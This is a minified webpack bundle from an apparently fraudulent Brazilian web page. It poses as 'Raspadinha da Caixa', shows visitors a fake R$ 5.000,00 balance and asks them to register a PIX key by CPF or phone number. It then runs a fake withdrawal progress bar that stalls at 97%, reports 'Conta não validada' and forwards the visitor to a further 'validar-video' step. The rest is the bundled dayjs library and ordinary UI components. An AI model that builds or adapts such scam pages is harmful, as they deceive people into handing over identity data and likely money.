(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [479], {
    285: (e, t, r) => {
      "use strict";
      r.d(t, {
        $: () => c,
        r: () => l
      });
      var s = r(5155);
      r(2115);
      var n = r(9708),
        a = r(2085),
        i = r(9434);
      let l = (0, a.F)(
        "inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive", {
          variants: {
            variant: {
              default: "bg-primary text-primary-foreground shadow-xs hover:bg-primary/90",
              destructive: "bg-destructive text-white shadow-xs hover:bg-destructive/90 focus-visible:ring-destructive/20 dark:focus-visible:ring-destructive/40 dark:bg-destructive/60",
              outline: "border bg-background shadow-xs hover:bg-accent hover:text-accent-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50",
              secondary: "bg-secondary text-secondary-foreground shadow-xs hover:bg-secondary/80",
              ghost: "hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50",
              link: "text-primary underline-offset-4 hover:underline"
            },
            size: {
              default: "h-9 px-4 py-2 has-[>svg]:px-3",
              sm: "h-8 rounded-md gap-1.5 px-3 has-[>svg]:px-2.5",
              lg: "h-10 rounded-md px-6 has-[>svg]:px-4",
              icon: "size-9"
            }
          },
          defaultVariants: {
            variant: "default",
            size: "default"
          }
        });

      function c(e) {
        let {
          className: t,
          variant: r,
          size: a,
          asChild: c = !1,
          ...o
        } = e, d = c ? n.DX : "button";
        return (0, s.jsx)(d, {
          "data-slot": "button",
          className: (0, i.cn)(l({
            variant: r,
            size: a,
            className: t
          })),
          ...o
        })
      }
    },
    780: (e, t, r) => {
      "use strict";
      r.r(t), r.d(t, {
        default: () => D
      });
      var s = r(5155),
        n = r(2115),
        a = r(5695),
        i = r(832),
        l = r.n(i),
        c = r(6325),
        o = r(285),
        d = r(2523),
        u = r(1154);
      let h = (0, r(9946).A)("phone", [
        ["path", {
          d: "M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384",
          key: "9njp5v"
        }]
      ]);
      var f = r(7565),
        m = r(1884);

      function x(e) {
        let {
          saldo: t = "R$ 5.000,00",
          onCadastrar: r
        } = e, [a, i] = (0, n.useState)("cpf"), [l, c] = (0, n.useState)(
          ""), [x, g] = (0, n.useState)(!1), p = async () => {
          if (!l.trim()) return;
          let e = l.replace(/\D/g, "");
          ("cpf" !== a || 11 === e.length) && ("telefone" !== a ||
            11 === e.length) && (g(!0), await new Promise(e =>
            setTimeout(e, 2500)), g(!1), null == r || r(a, e))
        };
        return (0, s.jsxs)(s.Fragment, {
          children: [x && (0, s.jsxs)("div", {
            className: "flex flex-col items-center justify-center min-h-[400px]",
            children: [(0, s.jsx)(u.A, {
              className: "size-8 text-white animate-spin mb-3"
            }), (0, s.jsx)("p", {
              className: "text-white font-semibold text-lg",
              children: "Validando chave PIX..."
            })]
          }), !x && (0, s.jsxs)("div", {
            className: "bg-white rounded-lg shadow-lg p-6 space-y-6",
            children: [(0, s.jsx)("h1", {
              className: "text-2xl font-bold text-[#045CA8] text-center",
              children: "Parab\xe9ns!"
            }), (0, s.jsxs)("div", {
              className: "text-center space-y-2",
              children: [(0, s.jsxs)("p", {
                className: "text-gray-700",
                children: [
                  "O seu saldo atual \xe9 de",
                  " ", (0, s.jsx)("span", {
                    className: "text-[#29A745] font-bold",
                    children: t
                  })
                ]
              }), (0, s.jsx)("p", {
                className: "text-gray-700 text-sm",
                children: "Cadastre sua chave PIX para o pr\xf3ximo passo!"
              })]
            }), (0, s.jsxs)("div", {
              className: "space-y-3",
              children: [(0, s.jsx)("h2", {
                className: "font-bold text-gray-800 text-sm",
                children: "Selecione seu tipo de chave PIX"
              }), (0, s.jsxs)("div", {
                className: "grid grid-cols-2 gap-3",
                children: [(0, s.jsxs)("button", {
                  type: "button",
                  onClick: () => {
                    i("cpf"), c("")
                  },
                  className: "\n              flex items-center justify-center gap-2 p-2 rounded-lg font-semibold transition-all\n              "
                    .concat("cpf" === a ?
                      "bg-[#045CA8] text-white" :
                      "bg-gray-200 text-gray-700 hover:bg-gray-300",
                      "\n            "),
                  children: [(0, s.jsx)(f
                  .h6O, {
                    className: "size-5"
                  }), "CPF"]
                }), (0, s.jsxs)("button", {
                  type: "button",
                  onClick: () => {
                    i("telefone"), c("")
                  },
                  className: "\n              flex items-center justify-center gap-2 p-2 rounded-lg font-semibold transition-all\n              "
                    .concat("telefone" === a ?
                      "bg-[#045CA8] text-white" :
                      "bg-gray-200 text-gray-700 hover:bg-gray-300",
                      "\n            "),
                  children: [(0, s.jsx)(h, {
                    className: "size-5"
                  }), "Telefone"]
                })]
              })]
            }), (0, s.jsx)("div", {
              className: "space-y-2",
              children: (0, s.jsx)(d.p, {
                type: "tel",
                inputMode: "numeric",
                placeholder: "cpf" === a ?
                  "Digite seu CPF..." :
                  "Digite seu telefone...",
                value: l,
                onChange: e => {
                  let t = e.target.value;
                  if ("cpf" === a) c((0, m.kl)(t));
                  else {
                    let e = t.replace(/\D/g, ""),
                      r = e;
                    e.length > 2 && (r = "(".concat(
                        e.slice(0, 2)), e.length >
                      2 && (r += ") ".concat(e
                        .slice(2, 7))), e.length >
                      7 && (r += "-".concat(e
                        .slice(7, 11)))), c(r)
                  }
                },
                onFocus: e => {
                  setTimeout(() => {
                    e.target.scrollIntoView({
                      behavior: "smooth",
                      block: "center"
                    })
                  }, 300)
                },
                className: "w-full p-5 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#045CA8] placeholder:text-center"
              })
            }), (0, s.jsx)(o.$, {
              onClick: p,
              disabled: 11 !== l.replace(/\D/g, "")
                .length || x,
              className: "\n          w-full font-bold py-6 text-base rounded-md transition-colors\n          "
                .concat(11 !== l.replace(/\D/g, "")
                  .length || x ?
                  "bg-gray-400 text-white cursor-not-allowed opacity-60" :
                  "bg-[#F3920B] hover:bg-[#D97F08] text-white",
                  "\n        "),
              children: x ? (0, s.jsxs)("div", {
                className: "flex items-center gap-2",
                children: [(0, s.jsx)(u.A, {
                  className: "size-5 animate-spin"
                }), "Validando..."]
              }) : "Cadastrar Chave PIX"
            })]
          })]
        })
      }
      var g = r(6695),
        p = r(4145),
        v = r(5339),
        b = r(5562);

      function y(e) {
        let {
          onError: t
        } = e, [r, a] = (0, n.useState)(0);
        (0, n.useEffect)(() => {
          let e = setInterval(() => {
            a(r => r >= 97 ? (clearInterval(e), setTimeout(() => {
              null == t || t()
            }, 500), 97) : Math.min(r + (r < 50 ? 2 : r < 80 ?
              1.5 : .5), 97))
          }, 100);
          return () => clearInterval(e)
        }, [t]);
        let i = 2 * Math.PI * 60;
        return (0, s.jsxs)(g.Zp, {
          className: "space-y-6 text-center w-full max-w-md",
          children: [(0, s.jsxs)(g.aR, {
            className: " flex flex-col items-center m-0",
            children: [(0, s.jsx)(b.ZB, {
              className: "text-2xl font-bold text-gray-800",
              children: "Processando Saque..."
            }), (0, s.jsx)(g.BT, {
              className: "text-gray-600",
              children: "Estamos criando e validando sua conta na Raspadinha da Caixa."
            })]
          }), (0, s.jsx)(b.Wu, {
            className: "flex justify-center p-0",
            children: (0, s.jsxs)("div", {
              className: "relative size-48",
              children: [(0, s.jsxs)("svg", {
                className: "transform -rotate-90",
                width: "192",
                height: "192",
                children: [(0, s.jsx)("circle", {
                  cx: "96",
                  cy: "96",
                  r: 60,
                  stroke: "#E5E7EB",
                  strokeWidth: "12",
                  fill: "none"
                }), (0, s.jsx)("circle", {
                  cx: "96",
                  cy: "96",
                  r: 60,
                  stroke: "#29A745",
                  strokeWidth: "12",
                  fill: "none",
                  strokeDasharray: i,
                  strokeDashoffset: i - r /
                    100 * i,
                  strokeLinecap: "round",
                  className: "transition-all duration-100"
                })]
              }), (0, s.jsx)("div", {
                className: "absolute inset-0 flex items-center justify-center",
                children: (0, s.jsxs)("span", {
                  className: "text-4xl font-bold text-[#29A745]",
                  children: [Math.round(r), "%"]
                })
              })]
            })
          })]
        })
      }

      function j() {
        return (0, s.jsxs)(g.Zp, {
          className: "text-center w-full gap-2 max-w-md",
          children: [(0, s.jsx)("div", {
            className: "flex justify-center",
            children: (0, s.jsx)("div", {
              className: "w-20 h-20 bg-red-500 rounded-full flex items-center justify-center",
              children: (0, s.jsx)(v.A, {
                className: "size-12 text-white"
              })
            })
          }), (0, s.jsx)("h1", {
            className: "text-2xl font-bold text-gray-800",
            children: "Erro"
          }), (0, s.jsx)("p", {
            className: "text-gray-700 text-lg",
            children: "Conta n\xe3o validada"
          })]
        })
      }

      function N(e) {
        let {
          valor: t = "R$ 5.000,00",
          nome: r,
          cpf: a,
          chavePix: i,
          tipoChave: l,
          dataPagamento: c,
          onConfirmar: d,
          onVoltar: u
        } = e, [h, f] = (0, n.useState)(!1), [m, x] = (0, n.useState)(!1);
        return ((0, n.useEffect)(() => {
          (h || m) && window.scrollTo({
            top: 0,
            behavior: "smooth"
          })
        }, [h, m]), h && !m) ? (0, s.jsx)(y, {
          onError: () => {
            x(!0), setTimeout(() => {
              null == d || d()
            }, 3e3)
          }
        }) : m ? (0, s.jsx)(j, {}) : (0, s.jsxs)(g.Zp, {
          className: "w-full max-w-md bg-white border-0 shadow-lg py-0 pb-6",
          children: [(0, s.jsx)(g.aR, {
            className: "border-b-2 border-gray-200 py-2 pt-4",
            children: (0, s.jsx)(g.ZB, {
              className: "font-bold text-[#045CA8] text-center",
              children: "Confirme as informa\xe7\xf5es"
            })
          }), (0, s.jsxs)(g.Wu, {
            className: "space-y-6",
            children: [(0, s.jsx)("div", {
              className: "bg-white rounded-lg border border-gray-200 p-4 shadow-md",
              children: (0, s.jsxs)("div", {
                className: "grid grid-cols-2 gap-4",
                children: [(0, s.jsxs)("div", {
                  className: "pr-4 border-r border-gray-300 text-center",
                  children: [(0, s.jsx)("p", {
                    className: "text-sm text-gray-700 mb-1",
                    children: "Valor"
                  }), (0, s.jsx)("p", {
                    className: "text-lg font-bold text-[#045CA8]",
                    children: t
                  })]
                }), (0, s.jsxs)("div", {
                  className: "pl-4 text-center",
                  children: [(0, s.jsx)("p", {
                    className: "text-sm text-gray-700 mb-1",
                    children: "Data"
                  }), (0, s.jsx)("p", {
                    className: "text-lg font-bold text-[#045CA8]",
                    children: c
                  })]
                })]
              })
            }), (0, s.jsxs)("div", {
              className: "space-y-3",
              children: [(0, s.jsx)("h2", {
                className: "font-bold text-[#045CA8] border-b-2 border-[#045CA8] pb-2",
                children: "Dados do recebedor"
              }), (0, s.jsxs)("div", {
                className: "space-y-2",
                children: [(0, s.jsxs)("div", {
                  children: [(0, s.jsx)("p", {
                    className: "text-sm text-gray-700",
                    children: "Nome"
                  }), (0, s.jsx)("p", {
                    className: "text-base font-bold text-gray-800",
                    children: r
                  })]
                }), (0, s.jsxs)("div", {
                  children: [(0, s.jsx)("p", {
                    className: "text-sm text-gray-700",
                    children: "CPF"
                  }), (0, s.jsx)("p", {
                    className: "text-base font-bold text-gray-800",
                    children: a
                  })]
                }), (0, s.jsxs)("div", {
                  children: [(0, s.jsx)("p", {
                    className: "text-sm text-gray-700",
                    children: "Chave PIX"
                  }), (0, s.jsx)("p", {
                    className: "text-base font-bold text-gray-800",
                    children: (() => {
                      if (
                        "telefone" ===
                        l) {
                        let e = i
                          .replace(
                            /\D/g,
                            "");
                        if (11 === e
                          .length)
                          return "("
                            .concat(
                              e
                              .slice(
                                0, 2
                                ),
                              ") ")
                            .concat(
                              e
                              .slice(
                                2, 7
                                ),
                              "-")
                            .concat(
                              e
                              .slice(
                                7))
                      }
                      return i
                    })()
                  })]
                })]
              })]
            }), (0, s.jsx)(p.Z0, {
              variant: "default",
              className: "bg-gray-100 rounded-lg",
              icon: (0, s.jsx)(v.A, {
                className: "size-6 text-[#045CA8]"
              }),
              children: (0, s.jsxs)(p.rb, {
                className: "text-xs text-gray-700 leading-relaxed",
                children: [(0, s.jsx)("span", {
                    className: "font-bold",
                    children: "ATEN\xc7\xc3O:"
                  }),
                  " Antes de finalizar esta transa\xe7\xe3o, confirme os dados do recebedor."
                ]
              })
            }), (0, s.jsxs)("div", {
              className: "space-y-3",
              children: [(0, s.jsx)(o.$, {
                onClick: () => {
                  f(!0)
                },
                className: "w-full font-bold py-6 text-base rounded-lg bg-[#F3920B] hover:bg-[#D97F08] text-white",
                children: "Confirmar"
              }), (0, s.jsx)(o.$, {
                onClick: u,
                variant: "outline",
                className: "w-full font-bold py-6 text-base rounded-lg border-2 border-[#F3920B] text-[#F3920B] hover:bg-gray-50",
                children: "Voltar"
              })]
            })]
          })]
        })
      }
      var $ = r(6929);

      function w() {
        let e = (0, a.useSearchParams)();
        return (0, s.jsx)(k, {
          searchParams: e
        })
      }

      function k(e) {
        let {
          searchParams: t
        } = e, r = (0, a.useRouter)(), i = null == t ? void 0 : t
          .toString(), [c, o] = (0, n.useState)(!1), [d, u] = (0, n
            .useState)({
            tipo: "cpf",
            valor: ""
          }), {
            name: h,
            cpf: f,
            isEmpty: g,
            isLoading: p
          } = (0, $.B)();
        (0, n.useEffect)(() => {
          !p && g && r.push("/inicio".concat(i ? "?".concat(i) : ""))
        }, [g, p, i, r]);
        let v = null == t ? void 0 : t.get("balance"),
          b = v ? parseFloat(v) : 0;
        return ((0, n.useEffect)(() => {
          c && window.scrollTo({
            top: 0,
            behavior: "smooth"
          })
        }, [c]), c) ? (0, s.jsx)("div", {
          className: "w-full max-w-md mx-auto",
          children: (0, s.jsx)(N, {
            valor: b > 0 ? (0, m.vv)(b) : "R$ 5.000,00",
            nome: h || "",
            cpf: f ? (0, m.bb)(f) : "",
            chavePix: "cpf" === d.tipo ? (0, m.bb)(d.valor) : d
              .valor,
            tipoChave: d.tipo,
            dataPagamento: l()().format("DD/MM/YYYY"),
            onConfirmar: () => {
              let e = new URLSearchParams((null == t ? void 0 :
                t.toString()) || "");
              r.push("../validar-video/index.html?".concat(e.toString()))
            },
            onVoltar: () => {
              o(!1)
            }
          })
        }) : (0, s.jsx)("div", {
          className: "w-full max-w-md",
          children: (0, s.jsx)(x, {
            saldo: b > 0 ? (0, m.vv)(b) : "R$ 5.000,00",
            onCadastrar: (e, r) => {
              u({
                tipo: e,
                valor: r
              });
              let s = new URLSearchParams((null == t ? void 0 :
                t.toString()) || "");
              s.set("pixTipo", e), s.set("pixValor", r), o(!0)
            }
          })
        })
      }

      function D() {
        return (0, s.jsx)(n.Suspense, {
          fallback: (0, s.jsx)(c.a, {}),
          children: (0, s.jsx)(w, {})
        })
      }
    },
    832: function(e) {
      e.exports = function() {
        "use strict";
        var e = "millisecond",
          t = "second",
          r = "minute",
          s = "hour",
          n = "week",
          a = "month",
          i = "quarter",
          l = "year",
          c = "date",
          o = "Invalid Date",
          d =
          /^(\d{4})[-/]?(\d{1,2})?[-/]?(\d{0,2})[Tt\s]*(\d{1,2})?:?(\d{1,2})?:?(\d{1,2})?[.:]?(\d+)?$/,
          u =
          /\[([^\]]+)]|Y{1,4}|M{1,4}|D{1,2}|d{1,4}|H{1,2}|h{1,2}|a|A|m{1,2}|s{1,2}|Z{1,2}|SSS/g,
          h = function(e, t, r) {
            var s = String(e);
            return !s || s.length >= t ? e : "" + Array(t + 1 - s
              .length).join(r) + e
          },
          f = "en",
          m = {};
        m[f] = {
          name: "en",
          weekdays: "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday"
            .split("_"),
          months: "January_February_March_April_May_June_July_August_September_October_November_December"
            .split("_"),
          ordinal: function(e) {
            var t = ["th", "st", "nd", "rd"],
              r = e % 100;
            return "[" + e + (t[(r - 20) % 10] || t[r] || t[0]) +
              "]"
          }
        };
        var x = "$isDayjsObject",
          g = function(e) {
            return e instanceof y || !(!e || !e[x])
          },
          p = function e(t, r, s) {
            var n;
            if (!t) return f;
            if ("string" == typeof t) {
              var a = t.toLowerCase();
              m[a] && (n = a), r && (m[a] = r, n = a);
              var i = t.split("-");
              if (!n && i.length > 1) return e(i[0])
            } else {
              var l = t.name;
              m[l] = t, n = l
            }
            return !s && n && (f = n), n || !s && f
          },
          v = function(e, t) {
            if (g(e)) return e.clone();
            var r = "object" == typeof t ? t : {};
            return r.date = e, r.args = arguments, new y(r)
          },
          b = {
            s: h,
            z: function(e) {
              var t = -e.utcOffset(),
                r = Math.abs(t);
              return (t <= 0 ? "+" : "-") + h(Math.floor(r / 60), 2,
                "0") + ":" + h(r % 60, 2, "0")
            },
            m: function e(t, r) {
              if (t.date() < r.date()) return -e(r, t);
              var s = 12 * (r.year() - t.year()) + (r.month() - t
                  .month()),
                n = t.clone().add(s, a),
                i = r - n < 0,
                l = t.clone().add(s + (i ? -1 : 1), a);
              return +(-(s + (r - n) / (i ? n - l : l - n)) || 0)
            },
            a: function(e) {
              return e < 0 ? Math.ceil(e) || 0 : Math.floor(e)
            },
            p: function(o) {
              return ({
                M: a,
                y: l,
                w: n,
                d: "day",
                D: c,
                h: s,
                m: r,
                s: t,
                ms: e,
                Q: i
              })[o] || String(o || "").toLowerCase().replace(/s$/,
                "")
            },
            u: function(e) {
              return void 0 === e
            }
          };
        b.l = p, b.i = g, b.w = function(e, t) {
          return v(e, {
            locale: t.$L,
            utc: t.$u,
            x: t.$x,
            $offset: t.$offset
          })
        };
        var y = function() {
            function h(e) {
              this.$L = p(e.locale, null, !0), this.parse(e), this.$x =
                this.$x || e.x || {}, this[x] = !0
            }
            var f = h.prototype;
            return f.parse = function(e) {
              this.$d = function(e) {
                var t = e.date,
                  r = e.utc;
                if (null === t) return new Date(NaN);
                if (b.u(t)) return new Date;
                if (t instanceof Date) return new Date(t);
                if ("string" == typeof t && !/Z$/i.test(t)) {
                  var s = t.match(d);
                  if (s) {
                    var n = s[2] - 1 || 0,
                      a = (s[7] || "0").substring(0, 3);
                    return r ? new Date(Date.UTC(s[1], n, s[3] || 1,
                        s[4] || 0, s[5] || 0, s[6] || 0, a)) :
                      new Date(s[1], n, s[3] || 1, s[4] || 0, s[
                        5] || 0, s[6] || 0, a)
                  }
                }
                return new Date(t)
              }(e), this.init()
            }, f.init = function() {
              var e = this.$d;
              this.$y = e.getFullYear(), this.$M = e.getMonth(), this
                .$D = e.getDate(), this.$W = e.getDay(), this.$H = e
                .getHours(), this.$m = e.getMinutes(), this.$s = e
                .getSeconds(), this.$ms = e.getMilliseconds()
            }, f.$utils = function() {
              return b
            }, f.isValid = function() {
              return this.$d.toString() !== o
            }, f.isSame = function(e, t) {
              var r = v(e);
              return this.startOf(t) <= r && r <= this.endOf(t)
            }, f.isAfter = function(e, t) {
              return v(e) < this.startOf(t)
            }, f.isBefore = function(e, t) {
              return this.endOf(t) < v(e)
            }, f.$g = function(e, t, r) {
              return b.u(e) ? this[t] : this.set(r, e)
            }, f.unix = function() {
              return Math.floor(this.valueOf() / 1e3)
            }, f.valueOf = function() {
              return this.$d.getTime()
            }, f.startOf = function(e, i) {
              var o = this,
                d = !!b.u(i) || i,
                u = b.p(e),
                h = function(e, t) {
                  var r = b.w(o.$u ? Date.UTC(o.$y, t, e) : new Date(o
                    .$y, t, e), o);
                  return d ? r : r.endOf("day")
                },
                f = function(e, t) {
                  return b.w(o.toDate()[e].apply(o.toDate("s"), (d ? [
                    0, 0, 0, 0
                  ] : [23, 59, 59, 999]).slice(t)), o)
                },
                m = this.$W,
                x = this.$M,
                g = this.$D,
                p = "set" + (this.$u ? "UTC" : "");
              switch (u) {
                case l:
                  return d ? h(1, 0) : h(31, 11);
                case a:
                  return d ? h(1, x) : h(0, x + 1);
                case n:
                  var v = this.$locale().weekStart || 0,
                    y = (m < v ? m + 7 : m) - v;
                  return h(d ? g - y : g + (6 - y), x);
                case "day":
                case c:
                  return f(p + "Hours", 0);
                case s:
                  return f(p + "Minutes", 1);
                case r:
                  return f(p + "Seconds", 2);
                case t:
                  return f(p + "Milliseconds", 3);
                default:
                  return this.clone()
              }
            }, f.endOf = function(e) {
              return this.startOf(e, !1)
            }, f.$set = function(n, i) {
              var o, d = b.p(n),
                u = "set" + (this.$u ? "UTC" : ""),
                h = ((o = {}).day = u + "Date", o[c] = u + "Date", o[
                    a] = u + "Month", o[l] = u + "FullYear", o[s] =
                  u + "Hours", o[r] = u + "Minutes", o[t] = u +
                  "Seconds", o[e] = u + "Milliseconds", o)[d],
                f = "day" === d ? this.$D + (i - this.$W) : i;
              if (d === a || d === l) {
                var m = this.clone().set(c, 1);
                m.$d[h](f), m.init(), this.$d = m.set(c, Math.min(this
                  .$D, m.daysInMonth())).$d
              } else h && this.$d[h](f);
              return this.init(), this
            }, f.set = function(e, t) {
              return this.clone().$set(e, t)
            }, f.get = function(e) {
              return this[b.p(e)]()
            }, f.add = function(e, i) {
              var c, o = this;
              e = Number(e);
              var d = b.p(i),
                u = function(t) {
                  var r = v(o);
                  return b.w(r.date(r.date() + Math.round(t * e)), o)
                };
              if (d === a) return this.set(a, this.$M + e);
              if (d === l) return this.set(l, this.$y + e);
              if ("day" === d) return u(1);
              if (d === n) return u(7);
              var h = ((c = {})[r] = 6e4, c[s] = 36e5, c[t] = 1e3, c)[
                  d] || 1,
                f = this.$d.getTime() + e * h;
              return b.w(f, this)
            }, f.subtract = function(e, t) {
              return this.add(-1 * e, t)
            }, f.format = function(e) {
              var t = this,
                r = this.$locale();
              if (!this.isValid()) return r.invalidDate || o;
              var s = e || "YYYY-MM-DDTHH:mm:ssZ",
                n = b.z(this),
                a = this.$H,
                i = this.$m,
                l = this.$M,
                c = r.weekdays,
                d = r.months,
                h = r.meridiem,
                f = function(e, r, n, a) {
                  return e && (e[r] || e(t, s)) || n[r].slice(0, a)
                },
                m = function(e) {
                  return b.s(a % 12 || 12, e, "0")
                },
                x = h || function(e, t, r) {
                  var s = e < 12 ? "AM" : "PM";
                  return r ? s.toLowerCase() : s
                };
              return s.replace(u, function(e, s) {
                return s || function(e) {
                  switch (e) {
                    case "YY":
                      return String(t.$y).slice(-2);
                    case "YYYY":
                      return b.s(t.$y, 4, "0");
                    case "M":
                      return l + 1;
                    case "MM":
                      return b.s(l + 1, 2, "0");
                    case "MMM":
                      return f(r.monthsShort, l, d, 3);
                    case "MMMM":
                      return f(d, l);
                    case "D":
                      return t.$D;
                    case "DD":
                      return b.s(t.$D, 2, "0");
                    case "d":
                      return String(t.$W);
                    case "dd":
                      return f(r.weekdaysMin, t.$W, c, 2);
                    case "ddd":
                      return f(r.weekdaysShort, t.$W, c, 3);
                    case "dddd":
                      return c[t.$W];
                    case "H":
                      return String(a);
                    case "HH":
                      return b.s(a, 2, "0");
                    case "h":
                      return m(1);
                    case "hh":
                      return m(2);
                    case "a":
                      return x(a, i, !0);
                    case "A":
                      return x(a, i, !1);
                    case "m":
                      return String(i);
                    case "mm":
                      return b.s(i, 2, "0");
                    case "s":
                      return String(t.$s);
                    case "ss":
                      return b.s(t.$s, 2, "0");
                    case "SSS":
                      return b.s(t.$ms, 3, "0");
                    case "Z":
                      return n
                  }
                  return null
                }(e) || n.replace(":", "")
              })
            }, f.utcOffset = function() {
              return -(15 * Math.round(this.$d.getTimezoneOffset() /
                15))
            }, f.diff = function(e, c, o) {
              var d, u = this,
                h = b.p(c),
                f = v(e),
                m = (f.utcOffset() - this.utcOffset()) * 6e4,
                x = this - f,
                g = function() {
                  return b.m(u, f)
                };
              switch (h) {
                case l:
                  d = g() / 12;
                  break;
                case a:
                  d = g();
                  break;
                case i:
                  d = g() / 3;
                  break;
                case n:
                  d = (x - m) / 6048e5;
                  break;
                case "day":
                  d = (x - m) / 864e5;
                  break;
                case s:
                  d = x / 36e5;
                  break;
                case r:
                  d = x / 6e4;
                  break;
                case t:
                  d = x / 1e3;
                  break;
                default:
                  d = x
              }
              return o ? d : b.a(d)
            }, f.daysInMonth = function() {
              return this.endOf(a).$D
            }, f.$locale = function() {
              return m[this.$L]
            }, f.locale = function(e, t) {
              if (!e) return this.$L;
              var r = this.clone(),
                s = p(e, t, !0);
              return s && (r.$L = s), r
            }, f.clone = function() {
              return b.w(this.$d, this)
            }, f.toDate = function() {
              return new Date(this.valueOf())
            }, f.toJSON = function() {
              return this.isValid() ? this.toISOString() : null
            }, f.toISOString = function() {
              return this.$d.toISOString()
            }, f.toString = function() {
              return this.$d.toUTCString()
            }, h
          }(),
          j = y.prototype;
        return v.prototype = j, [
          ["$ms", e],
          ["$s", t],
          ["$m", r],
          ["$H", s],
          ["$W", "day"],
          ["$M", a],
          ["$y", l],
          ["$D", c]
        ].forEach(function(e) {
          j[e[1]] = function(t) {
            return this.$g(t, e[0], e[1])
          }
        }), v.extend = function(e, t) {
          return e.$i || (e(t, y, v), e.$i = !0), v
        }, v.locale = p, v.isDayjs = g, v.unix = function(e) {
          return v(1e3 * e)
        }, v.en = m[f], v.Ls = m, v.p = {}, v
      }()
    },
    1243: (e, t, r) => {
      "use strict";
      r.d(t, {
        A: () => s
      });
      let s = (0, r(9946).A)("triangle-alert", [
        ["path", {
          d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",
          key: "wmoenq"
        }],
        ["path", {
          d: "M12 9v4",
          key: "juzpu7"
        }],
        ["path", {
          d: "M12 17h.01",
          key: "p32p05"
        }]
      ])
    },
    1284: (e, t, r) => {
      "use strict";
      r.d(t, {
        A: () => s
      });
      let s = (0, r(9946).A)("info", [
        ["circle", {
          cx: "12",
          cy: "12",
          r: "10",
          key: "1mglay"
        }],
        ["path", {
          d: "M12 16v-4",
          key: "1dtifu"
        }],
        ["path", {
          d: "M12 8h.01",
          key: "e9boi3"
        }]
      ])
    },
    1884: (e, t, r) => {
      "use strict";

      function s(e) {
        return e.replace(/\D/g, "").slice(0, 11).replace(
          /(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
      }

      function n(e) {
        let t = e.replace(/\D/g, "").slice(0, 11);
        return t.length > 9 ? t.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/,
            "$1.$2.$3-$4") : t.length > 6 ? t.replace(
            /(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3") : t.length > 3 ? t
          .replace(/(\d{3})(\d{1,3})/, "$1.$2") : t
      }

      function a(e) {
        return e.toLowerCase().split(" ").map(e => e.charAt(0)
          .toUpperCase() + e.slice(1)).join(" ")
      }

      function i(e) {
        let t = "string" == typeof e ? parseFloat(e.replace(/[^\d,]/g, "")
          .replace(",", ".")) || 0 : e;
        return new Intl.NumberFormat("pt-BR", {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2
        }).format(t)
      }

      function l(e) {
        if (!e) throw Error();
        return e.replace(/\D/g, "")
      }

      function c(e) {
        let t = e.replace(/\D/g, "");
        if (11 !== t.length || /^(\d)\1{10}$/.test(t)) return !1;
        let r = 0;
        for (let e = 0; e < 9; e++) r += Number.parseInt(t.charAt(e)) * (
          10 - e);
        let s = 10 * r % 11;
        if ((10 === s || 11 === s) && (s = 0), s !== Number.parseInt(t
            .charAt(9))) return !1;
        r = 0;
        for (let e = 0; e < 10; e++) r += Number.parseInt(t.charAt(e)) * (
          11 - e);
        return (10 == (s = 10 * r % 11) || 11 === s) && (s = 0), s ===
          Number.parseInt(t.charAt(10))
      }
      r.d(t, {
        Or: () => c,
        Zm: () => l,
        bb: () => s,
        kR: () => a,
        kl: () => n,
        vv: () => i
      })
    },
    2523: (e, t, r) => {
      "use strict";
      r.d(t, {
        p: () => a
      });
      var s = r(5155);
      r(2115);
      var n = r(9434);

      function a(e) {
        let {
          className: t,
          type: r,
          ...a
        } = e;
        return (0, s.jsx)("input", {
          type: r,
          "data-slot": "input",
          className: (0, n.cn)(
            "file:text-foreground placeholder:text-muted-foreground selection:bg-primary selection:text-primary-foreground dark:bg-input/30 border-input flex h-9 w-full min-w-0 rounded-md border bg-transparent px-3 py-1 text-base shadow-xs transition-[color,box-shadow] outline-none file:inline-flex file:h-7 file:border-0 file:bg-transparent file:text-sm file:font-medium disabled:pointer-events-none disabled:cursor-not-allowed disabled:opacity-50 md:text-sm",
            "aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive",
            t),
          ...a
        })
      }
    },
    3453: (e, t, r) => {
      "use strict";
      r.d(t, {
        A: () => s
      });
      let s = (0, r(9946).A)("circle-check", [
        ["circle", {
          cx: "12",
          cy: "12",
          r: "10",
          key: "1mglay"
        }],
        ["path", {
          d: "m9 12 2 2 4-4",
          key: "dzmm74"
        }]
      ])
    },
    4145: (e, t, r) => {
      "use strict";
      r.d(t, {
        Hn: () => u,
        Z0: () => d,
        rb: () => h
      });
      var s = r(5155);
      r(2115);
      var n = r(1284),
        a = r(1243),
        i = r(3453),
        l = r(4861),
        c = r(9434);
      let o = {
        default: {
          container: "bg-gray-50",
          text: "text-gray-800",
          icon: (0, s.jsx)(n.A, {
            className: "size-5"
          })
        },
        warning: {
          container: "bg-yellow-50 border-l-4 border-orange-400",
          text: "text-[rgba(133,100,4,1)]",
          icon: (0, s.jsx)(a.A, {
            className: "size-5"
          })
        },
        success: {
          container: "bg-green-50 border-l-4 border-green-500",
          text: "text-green-800",
          icon: (0, s.jsx)(i.A, {
            className: "size-5"
          })
        },
        error: {
          container: "bg-red-50 border-l-4 border-red-500",
          text: "text-red-800",
          icon: (0, s.jsx)(l.A, {
            className: "size-5"
